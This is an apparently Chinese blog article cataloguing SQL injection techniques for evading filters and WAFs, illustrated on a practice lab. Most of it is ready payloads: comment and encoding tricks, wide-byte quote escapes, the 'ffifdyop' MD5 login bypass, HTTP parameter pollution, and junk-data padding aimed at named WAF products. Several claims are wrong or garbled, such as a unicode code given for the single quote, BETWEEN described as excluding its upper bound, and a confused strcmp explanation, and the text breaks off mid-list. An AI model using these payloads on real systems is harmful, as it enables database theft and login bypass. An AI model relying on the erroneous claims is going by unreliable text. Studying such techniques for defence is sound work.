> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzg5NjUxOTM3Mg==&mid=2247489564&idx=1&sn=c4414962efca1b4bf3e49263f36f5933

#  Sql注入绕过总结之冰山一角  
原创 一个努力的学渣  一个努力的学渣   2025-06-25 14:06  
  
免责声明  
  
本文只做学术研究使用，不可对真实未授权网站使用，如若非法他用，与平台和本文作者无关，需自行负责！  
  
本文以sqllib举例，sqllib未成功并不代表其他环境不成功  
# 注释符绕过  
- --  注释内容  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjgGJpRIxJjvicok2xBnNuqicTJIyMQpt4vNcukgkwrhkMMstxN1ibl7TGA/640?wx_fmt=png&from=appmsg "")  
- # 注释内容  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjunDxo2YXKzyjnfUOBsX2V6qLPNEjFKRE63rUssFWxzGpsZh3yY4ytQ/640?wx_fmt=png&from=appmsg "")  
- %23		#其实就是#  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjKLtpTCyFUe8FO3q40ICqhLInicRe5P7KHeMtKYniaXxDwq4qyBe538mQ/640?wx_fmt=png&from=appmsg "")  
- /*注释内容*/  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjibxiaU0oXVdPiaroj6cJic0DG8QXDSCuCJZTPL6ZsibPDaicvJnric59Dh0KQ/640?wx_fmt=png&from=appmsg "")  
- ;%00  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGj64dQZne0ZbbtZGiawW3PFXDAbxGAtgoYUvfQTTZa7FbiaV10XuyKPOGw/640?wx_fmt=png&from=appmsg "")  
- -- -  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjyt1KuUJfFXxdEqMWiclLiaz4Q2w5WntZn4FdSGOw8LwyRicnRDXicGQeWQ/640?wx_fmt=png&from=appmsg "")  
- -- +  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjGpDDgcpQ98Uks6v5SVnPxv2AOedsSfI9nrTSehOLGHfo1ruQALspfA/640?wx_fmt=png&from=appmsg "")  
- or '1'='1  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjhOgK9uFcGI33KsZFxSpZntXtcSJezyd7hRZzPgBjxtHjMxupCCu9cA/640?wx_fmt=png&from=appmsg "")  
- and '1'='1  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjacy6XxDibUArpGUGVy2eYOxtJQjESYl5AYMPMPmzL4a9gS4C1xFSibkQ/640?wx_fmt=png&from=appmsg "")  
- and '1  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjaIDxkOXDEpn4ibv4t1TqWfmyy92hzUDjL2WpOUofiafcpJAA97mOmGgA/640?wx_fmt=png&from=appmsg "")  
- '3  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjiaYgkJRicvIBpO3loMUdcaj3sfxC2Dy0Ng9kqsibNSeVJXnby7ShP0pZg/640?wx_fmt=png&from=appmsg "")  
- ||'1  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjNFOK6eiclK8eictRZicA2DcOmjDZbFia30VJfz5udicQLXQSnUDUmoR3vLw/640?wx_fmt=png&from=appmsg "")  
# 大小写绕过  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGj5GDFXAfR9eamGNFFgicH0d0EABqrbluLoO385Fnatyqr1SvcVJgROgw/640?wx_fmt=png&from=appmsg "")  
  
简单的说就是上面的内容全部替换为空，并且关键字符区分大小写  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjMRtfEyibCLL7K87xUoA60CEN1tib50r2tPeVibAxFA4c2xWAZTNTibtX3g/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGj8VNfAcAb1Jo1KCBHgr4wGPBSFnWXGF5hDegu9eZG6INt1RLqlKlTKw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjJeicz22QjjVgrJPPrdEhrqAJHRmY4BFEqIJTSqWKYSgaePAaVE7GN7w/640?wx_fmt=png&from=appmsg "")  
# 内联注释绕过  
-  /*!函数*/：select * from test /*!union*/ select 1,2  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjjls2NletfTrbSyr2HGceLnsyVa4OFgB5O5qKFzpuaazH7KjSTmSGfA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjJEmvvujkpvRPMt6evEZYPibvWAqhFTgiaiaSxMt6SZeLfDgsKIXrEopiaQ/640?wx_fmt=png&from=appmsg "")  
# 双写绕过  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGja48EjAHbzicxmDf6LMInaQSp73A5vuuUBGAalPFA0q76Knfqa6YWAlw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGj5BCTTPGJkJhImxageatELwv59ibL8sOpY7WjNbHLkqz5cr3A0FR2s5A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGj1kzga46vibTlibetMCmPrSlxYzQ0iagTn0Meb4T5JJO9hFB4hs3uKicP2Q/640?wx_fmt=png&from=appmsg "")  
# 编码绕过  
- 对关键字进行两次url全编码/单次URL编码绕过：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjRT0U5kEeicibDwZTsQ09YGqJNebcPQ2FjoVVzleWf4zJDtdLoo797fSQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjtD6dcfyckiaKx1LNWEsQwwibzVakhKyJG6WmX13hrW1qR9aIEKqD2RicA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjsEkbUu9EvwuQrl5XibGKurukiclDZjiaCc2GJTYDYpURbBHQjQickCRbFA/640?wx_fmt=png&from=appmsg "")  
- ascii编码绕过：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjbsG3kxSax9I4ureM8URicic7jxCOr9KtwyIccn3demDEq5gfP1WKpG5w/640?wx_fmt=png&from=appmsg "")  
- Base64编码绕过  
  
- 16进制绕过：  
  

```
select * from users where username = 'users';
select * from users where username = 0x7573657273;
```

- unicode编码对部分符号的绕过：  
  

```
单引号=> %u0037 %u02b9
空格=> %u0020 %uff00
左括号=> %u0028 %uff08
右括号=> %u0029 %uff09
```

# <>大于小于号绕过  
- greatest(n1, n2, n3…):返回n中的最大值  
- 数据库第一个字符为t，ascii编码为116：SELECT * from test where test=123 and greatest(ascii(substr(database(),1,1)),1)=116  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjGvfMISTON8dcpJUicDn0xNBSEyOfWJKWgcUqdQnJjDgxn4pbkS26Ygw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjPqKgFic86pJ0HXlrxRemj1LlLJMlWgoczya76KgWUTagvibvnsDZfSZw/640?wx_fmt=png&from=appmsg "")  
- least(n1,n2,n3…):返回n中的最小值（ASCII最大值为127）  
- 数据库第一个字符为t，ascii编码为116：SELECT * from test where test=123 and least(ascii(substr(database(),1,1)),200)=116  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjfNGRHaAxrfAFwycicKSL1q2nBV3rO7fwc8WeeibaJyLuk9QWDpKW5exA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjQ5CcYUJroE7RjlyiaE2dncDuibwqJW6se9jrCnpDlMJBoASiblkOibwb4w/640?wx_fmt=png&from=appmsg "")  
- strcmp(str1,str2)：若所有的字符串均相同，则返回STRCMP()，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1  
- SELECT * from test where test=123 AND strcmp(CAST(ASCII(SUBSTR(DATABASE(), 1, 1)) AS CHAR), '116') = 0  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjHncnSiaLcLheCQ0ZkmFb941jI73tUwiabzZAibcRsibKibpTnKDoTrpPrlg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjuTQMrMSI1LQpjJZU7gjN3yNUDUhuVQjmhZCEiaemewCUyppFB41BTqQ/640?wx_fmt=png&from=appmsg "")  
- in关键字：SELECT * from test where test=123 AND ASCII(SUBSTR(DATABASE(),1,1)) = 116  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjyu3UsFibGoVofmiccmYRAoiaHrGTcvZuc7YCJ2uCD5X3DVSPtibCSMaqWQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGj0feeoIxxq8PIeZJ0jmXqibh8oHMC9ARnF9VyoElvRGibqxZRysHZl6PQ/640?wx_fmt=png&from=appmsg "")  
- between a and b:范围在a-b之间（不包含b）  
- SELECT * from test where test=123 AND ASCII(SUBSTR(DATABASE(), 1, 1)) BETWEEN 115 AND 117  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjkB3mFQ3Oa8TxSf0moZV1VJx13gG6BrM8aAKV6iabWdl08MjumYwicicDQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjxzDLNLo4q5jWZFqVCZRyKGCvJh2snSk83C8b3SyRBvW2YZznEvOibHQ/640?wx_fmt=png&from=appmsg "")  
# 空格绕过  
- %0a  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjZAjpIDcmRDhuZ5Hznxticcr4W5X9dH6SXrX5OKibVXestLns3SnrT18A/640?wx_fmt=png&from=appmsg "")  
- %09  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjJdG2SlSqbUMjRgSAkrCeBycZVlBhMYa20kAQ9uvseeibLtbrJAdFQww/640?wx_fmt=png&from=appmsg "")  
- %0d  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjVVwbj6LMYVgTbjXhPSyRCXGT6g3lQHo3c629ibm7hnDZ9GzlSptUl1g/640?wx_fmt=png&from=appmsg "")  
- %0b  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjblTIhrs1agaPhOdFufBmwHtwBk1HyQarC4tOA7nTEibnEkHb2lHv7Iw/640?wx_fmt=png&from=appmsg "")  
- %0c  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjGertI3c3sBE35LVURgwA4e192HiaHjLsuBAfpVm4NdJnX2vCmdSq6VA/640?wx_fmt=png&from=appmsg "")  
- %20  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGj2vcAqeVThoQMpETVdLt28vEZlSkFSMCXEeXooaHdDDhLicvz6m6tZQw/640?wx_fmt=png&from=appmsg "")  
- ()  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjXMtd9xYibFMVjMh8znwpHlvEK2ibKRnicfXTT6aH9RiaQbxBGexn3HI4yg/640?wx_fmt=png&from=appmsg "")  
- +  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjQWVicxmt4VxpymH6e1hUG10yeNx1aQqbrObWXZy2FiaKCjFT8ohYdb6Q/640?wx_fmt=png&from=appmsg "")  
- /**/  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjgibJGljB6IqWTdgxcWIWGE3ovSfJNv7Eb3WPoic9icZlUSqT84Od6IjdA/640?wx_fmt=png&from=appmsg "")  
- 两个空格  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjJTt0rwdratF2LzBqdGQmfEvGOvXIJOdsUN56UkSvX8VeYKTMOKzSnA/640?wx_fmt=png&from=appmsg "")  
# or and xor not绕过  
- or = ||  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjWic0ia9lGGXGsdHd2iaA0Mbj0aEiaDfPRJ7fqqhUVNxw95icUNZqRZJxTSw/640?wx_fmt=png&from=appmsg "")  
- and = &&  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjR2P4IvCP0rF59NcIiabZYPbxwwHBNVlAyAgz8TjXZvUldvLODaIcdlw/640?wx_fmt=png&from=appmsg "")  
- xor =  ^ 		#异或,  
  
- 例如select * from test  where 1 XOR (SELECT SUBSTRING(database(),1,1)='t')  
  
- XOR 运算的特性：真 XOR 真 = 假，假 XOR 假 = 假，真 XOR 假 = 真  
- 攻击者通过构造如 1' XOR (条件) XOR '1'='0 的语句，利用页面返回差异（真/假状态）推断数据库信息  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGj6GBkN62Vkg3VASoC4hVVWXTibI7dVJ59fPGMg4W5Wvwyg3MaoEsM8gA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGj8ZmZsx0xia9N7Ajf0pxyMyTFtH4UX72xWp6jmNKoDcjBDfw3KEiaFtoQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjeP204tdGQRrELnlzz3gtrMfGlfMSqarTysZPxmfy3dSaIrC8ad2bqQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGj280vtZibfxictskjbBsPguNC07VSKibZG9OWyrbGYZpiaaETEqjibdgETzw/640?wx_fmt=png&from=appmsg "")  
- not = !	#取反  
  
- select * from test WHERE 1 AND NOT ((SELECT SUBSTR(password,1,1) FROM admin LIMIT 1) = 't')  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjewHiby5cWqYN64I7RNn0lhlQOAWRR5UTksqw6Cyp2E08bgekb0UhwCA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjdscoQGpXad6cvgicBibCw2pXTb7lNib9aXunrSWYhic9kl51iaRrPr9PNtw/640?wx_fmt=png&from=appmsg "")  
# 对等号=绕过  
- like：  
  
-  select * from test where test like "a%";  
  
-  select * from test where test like "admin";  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjHOZ0GDExSa1dFicX08uvj7vwsBhYeMY3M4Ol2ibZlYpicM7AXGNGTfx4w/640?wx_fmt=png&from=appmsg "")  
- regexp：select * from test where test REGEXP "admin";  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjCMOXL1JFUPxo6wUKE7viar56sKd5Iy8kE8SGN6RoTBTHIBscZ4GicYNg/640?wx_fmt=png&from=appmsg "")  
- 大小于号绕过：select * from test where test > "a" and test < "s"  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjE1vcAQ3ibTEG8DqasZGErWns95e4EqiczvAnfNbWgRKmngScCzfGAqgQ/640?wx_fmt=png&from=appmsg "")  
- <> 等价于 != ,所以在前面再加一个 ! 结果就是等号了：select * from test where !(test <> "admin");  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjCWExd2jtQcor145iahhLuqcRe3CpXc75SVtFYnC73de5gvScSMTHv6g/640?wx_fmt=png&from=appmsg "")  
# 对单引号绕过  
- 16进制绕过：  
- select * from test where test=0x61646D696E	  
#等价于 test='admin'  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjEvOBY9AcbuJJy66Cwfiaf6iciaoKJ7ra6QEqSoFDBHHxic8dyic0y0wYLKQ/640?wx_fmt=png&from=appmsg "")  
- CHAR()函数绕过：  
- select * from test where test=CHAR(97, 100, 109, 105, 110)		#等价于 test='admin'  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGj7INbpE1t0uMbBYGc5fdfdoB31ttSvL68K5tt0FrjLI2JaWCbpQpyVg/640?wx_fmt=png&from=appmsg "")  
- 双引号替代：  
- 局限性：  
仅当 SQL 语句允许双引号包裹字符串时有效  
- 宽字节注入(GBK编码环境)  
- 输入 %df%27（%27 为单引号），转义后变为 %df%5c%27 → GBK 解码为 運'，使单引号逃逸  
- **条件**  
：数据库采用 GBK 等双字节编码，且使用 addslashes() 等转义函数  
# 对逗号绕过  
- 使用offset绕过：  
- Select * from test limit 0,1等价于select * from test limit 1 offset 0  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjM4hOlOIhKXhZibhT4vgbmIcbKoLCh9M3OjF7qzyYLN6weP0uOibKyyiag/640?wx_fmt=png&from=appmsg "")  
- Select * from test limit 0,2等价于select * from test limit 2 offset 0  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjNSic7QSfBiauoNLh4l4Gn5mayawQyZVTIeUctSwbI8Q8Noc3CuWBzGicw/640?wx_fmt=png&from=appmsg "")  
- 用“join”拼接字段：  
- Union select DATABASE(),version()等价于union select * from test union select * from(select DATABASE())a join (select version())b  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjiarN6FQVIickd7oqUOJtwqmBLsAjy7Gy2HOqRhugnOibjqfKdZBkic1o2w/640?wx_fmt=png&from=appmsg "")  
- from to：  
- 对于substr()和mid()这两个方法可以使用from for 的方式来解决： select substr(database() from 1 for 1)='c';  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjza7gRA9ibw8xq9SWowOS8lA13ibeIjlicTT3rAocykTXbnicxGwFgkZAkw/640?wx_fmt=png&from=appmsg "")  
- SUBSTR(database(),1,1)等价于Select substr(database() from 1 for 1);  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjpcmicPpCa2meLT3ibk2O2aVcs1KM6cOgBAicgNhnCGoJRLc43gIWTafUw/640?wx_fmt=png&from=appmsg "")  
- like：Select ascii(mid(user(),1,1))=114等价于select user() like 'r%'  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjwQ4LwtSDQ4w8q4ryV1DV7n2jDGF5WZH5sKE3Bv2kR00yVoD8b3XINw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjyVoJURKSnzVMFibEr7zJsKpnORx4EPAkZEQcIzPFZ8TEATbBvEWaaSA/640?wx_fmt=png&from=appmsg "")  
# 空字节绕过  
- **原理**  
：WAF通常基于正则表达式匹配关键词（如UNION、SELECT）。空字节%00在C语言中表示字符串结束符，若WAF底层使用C/C++编写，解析到%00时会提前终止扫描，忽略后续恶意代码  
- **适用场景**  
：老旧WAF或未适配空字节检测的防护系统（如部分云WAF旧版本）  
- id=1%00  
' union select username,password from users where username='admin' --  
# ' ".md5($pass,true)" '登录绕过  
- 代码：SELECT * FROM users WHERE password = '.md5($password,true).';  
- **md5(, true) 的特性：**  
PHP 中 md5($str, true) 返回原始 16 字节二进制数据（而非 32 位十六进制字符串）。特定字符串的 MD5 二进制结果可能包含 'or' 等 SQL 元字符  

```
示例：字符串 &#34;ffifdyop&#34; 的 MD5 二进制值为 `'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c
`SELECT * FROM users WHERE password = ''or'6...'  -- 永真条件
```

- **关键点**  
：二进制数据中的 'or' 被 SQL 解析为逻辑运算符，6... 作为非零字符串被判定为 True，导致整个条件恒成立  
- **攻击 Payload 构造：**  
输入密码为 ffifdyop 时，其 MD5 二进制值恰好形成 'or'6<乱码> 结构，使查询变为：  

```
SELECT * FROM users WHERE password = ''or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c'     
-- 等价于：WHERE password = '' OR TRUE
```

- 攻击者无需知道真实密码即可登录任意账户（通常首个用户为管理员）  
# HTTP参数污染  
- HTTP参数污染（HTTP Parameter Pollution，HPP）是一种利用Web应用对同名HTTP参数处理差异的漏洞攻击技术，常被用于绕过WAF（Web应用防火墙）或实现SQL注入  
- **同名参数处理差异**  
：不同Web服务器和编程语言对同名参数的处理逻辑不同，导致攻击者可通过重复参数混淆检测逻辑  
- **PHP/Apache**  
：取最后一个参数值（如?id=1&id=2 → id=2）  
- **JSP/Tomcat**  
：取第一个参数值（如?id=1&id=2 → id=1）  
- **ASP/IIS**  
：合并所有值为逗号分隔字符串（如?id=1&id=2 → id=1,2）  
- **绕过WAF的核心逻辑：**  
WAF通常只检测首个参数，而应用程序可能取最后一个参数值执行，从而绕过过滤  
- WAF检测id=1'（触发拦截），但应用执行id=2：  
?id=1' UNION SELECT 1,2,3-- &id=2  
-  ?id=1&id=2' UNI/**/ON SEL/**/ECT 1,user(),3--   
- **效果**  
：WAF仅检查id=1（无害），应用执行id=2'...（注入成功）  
- **注入试探：**  
 ?id=1'&id=2   
- 若返回错误，说明首个参数被解析；若正常，则末参数可能被执行  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RympQJjBW3RD4FSOek13LGjTnLwphaBnAKxLR3E0MtPWuUVCYXZaYjxgwu36tQ9x25D6mibXHdaGKA/640?wx_fmt=png&from=appmsg "")  
# 垃圾数据绕过  
- “垃圾数据绕过”（Junk Data Overflow）是 SQL 注入中一种针对 Web 应用防火墙（WAF）或过滤规则的绕过技术，其核心原理是**通过填充大量无意义字符（如注释、空格、重复关键词）使攻击载荷超过 WAF 的检测阈值**  
，导致 WAF 因处理能力不足而放行恶意语句  
- **垃圾数据溢出 WAF 检测上限：**  
WAF 通常设置请求长度或关键词检测阈值（如 4KB-8KB）。通过在注入语句中插入大量注释（/**/）、换行符（%0A）、重复关键词（如 unionunion）或随机字符串，使请求体超出 WAF 的处理能力，从而绕过检测  
- **示例：**  
 ?id=1'/*!11444and*/ *//**//**//**/...（重复千次）.../**/union select 1,2,database()--+  
- 当注释填充超过 WAF 的解析上限时，后续的 `union select` 可能被忽略  
- **特殊字符混淆组合：**  
- **内联注释**  
：利用 /*!50001union*/ 等 MySQL 特有语法，将恶意代码伪装成合法注释  
- **非常规空白符**  
：用 %0A（换行）、%09（制表符）、%a0（非断空格）替代空格，避开基于空格的规则匹配  
- **编码干扰**  
：插入 URL 编码（如 %253A 双重编码）、Base64 或 Unicode 字符，扰乱 WAF 的解码逻辑  
- **应用场景：**  
<table><tbody><tr><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;background-color: rgb(248, 248, 250);"><p style="margin: 0;padding: 0;min-height: 24px;text-align: left;"><strong><span style="color: rgb(55, 58, 64);"><span leaf="">场景</span></span></strong></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;background-color: rgb(248, 248, 250);"><p style="margin: 0;padding: 0;min-height: 24px;text-align: left;"><strong><span style="color: rgb(55, 58, 64);"><span leaf="">Payload 构造要点</span></span></strong></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;background-color: rgb(248, 248, 250);"><p style="margin: 0;padding: 0;min-height: 24px;text-align: left;"><strong><span style="color: rgb(55, 58, 64);"><span leaf="">绕过目标</span></span></strong></p></td></tr><tr><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;text-align: left;"><strong><span style="color: rgb(55, 58, 64);"><span leaf="">安全狗/云WAF</span></span></strong></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;text-align: left;"><span style="color: rgb(55, 58, 64);"><span leaf="">在</span></span><span style="color: rgb(55, 58, 64);"></span><span style="color: rgb(55, 58, 64);"><span leaf="">union select</span></span><span style="color: rgb(55, 58, 64);"></span><span style="color: rgb(55, 58, 64);"><span leaf="">间插入</span></span><span style="color: rgb(55, 58, 64);"></span><span style="color: rgb(55, 58, 64);"><span leaf="">/*!*/</span></span><span style="color: rgb(55, 58, 64);"></span><span style="color: rgb(55, 58, 64);"><span leaf="">和垃圾字符：</span><span leaf=""><br/></span></span><span style="color: rgb(55, 58, 64);"><span leaf="">union/*!*//*%0a*/select 1,@@version,3</span></span></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;text-align: left;"><span style="color: rgb(55, 58, 64);"><span leaf="">避开 union select 关键词检测</span></span></p></td></tr><tr><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;text-align: left;"><strong><span style="color: rgb(55, 58, 64);"><span leaf="">D盾防护</span></span></strong></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;text-align: left;"><span style="color: rgb(55, 58, 64);"><span leaf="">填充表情符号（如</span></span><span style="color: rgb(55, 58, 64);"></span><span style="color: rgb(55, 58, 64);"><span leaf="">😂</span></span><span style="color: rgb(55, 58, 64);"><span leaf="">）或生僻字符：</span><span leaf=""><br/></span></span><span style="color: rgb(55, 58, 64);"><span leaf="">?id=1&#39;</span></span><span style="color: rgb(55, 58, 64);"><span leaf="">😂</span></span><span style="color: rgb(55, 58, 64);"><span leaf="">&#39; union select 1,2,3 --+</span></span></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;text-align: left;"><span style="color: rgb(55, 58, 64);"><span leaf="">干扰字符黑白名单规则</span></span></p></td></tr><tr><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;text-align: left;"><strong><span style="color: rgb(55, 58, 64);"><span leaf="">分块传输（Chunked）</span></span></strong></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;text-align: left;"><span style="color: rgb(55, 58, 64);"><span leaf="">在 HTTP 请求体中分块插入垃圾数据：</span><span leaf=""><br/></span></span><span style="color: rgb(55, 58, 64);"><span leaf="">5\r\nid=1\r\n6\r\n%00&#39;\r\n...</span></span></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;text-align: left;"><span style="color: rgb(55, 58, 64);"><span leaf="">绕过 WAF 对完整请求的解析</span></span></p></td></tr><tr><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;text-align: left;"><strong><span style="color: rgb(55, 58, 64);"><span leaf="">报错注入屏蔽</span></span></strong></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;text-align: left;"><span style="color: rgb(55, 58, 64);"><span leaf="">在报错函数前添加超长注释：</span><span leaf=""><br/></span></span><span style="color: rgb(55, 58, 64);"><span leaf="">updatexml(1,concat(0x7e,(/*!*/database/*////*/(),0x7e)</span></span></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;text-align: left;"><span style="color: rgb(55, 58, 64);"><span leaf="">避免触发</span></span><span style="color: rgb(55, 58, 64);"></span><span style="color: rgb(55, 58, 64);"><span leaf="">database()</span></span><span style="color: rgb(55, 58, 64);"></span><span style="color: rgb(55, 58, 64);"><span leaf="">等关键词</span></span></p></td></tr></tbody></table>  
- **关键技巧：**  
